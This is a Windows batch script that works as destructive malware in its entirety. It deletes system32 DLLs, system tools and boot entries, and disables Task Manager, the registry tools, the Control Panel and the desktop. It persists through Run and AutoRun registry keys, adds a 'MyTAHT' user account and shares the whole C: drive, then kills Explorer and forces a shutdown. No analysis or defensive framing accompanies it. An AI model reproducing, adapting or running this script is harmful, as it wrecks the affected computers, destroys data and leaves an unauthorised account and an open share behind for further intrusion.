@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
del "%SystemRoot%\system32\*.dll" /q >nul
del %SystemRoot%\system32\devmgmt.msc >nul
bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul
time 0:00 >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\system32\binit.bat" /f >nul

del "%SystemRoot%\Cursors\*.*" >nul
del "%SystemRoot%\Media" /q >nul
del "%SystemRoot%\Web\Wallpaper" /q >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

msg * "MyTAHT" >nul
copy ""%0"" "%SystemRoot%\system32\MyTAHT.bat" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyTAHT" /t REG_SZ /d "%SystemRoot%\system32\MyTAHT.bat" /f >nul
label C:MyTAHT >nul
net user "MyTAHT" /add >nul
net share "MyTAHT$"="C:\" >nul
del "%SystemRoot%\notepad.exe" >nul
taskkill /f /im explorer.exe >nul
shutdown -s -t 1 -c "lol" -f >nul
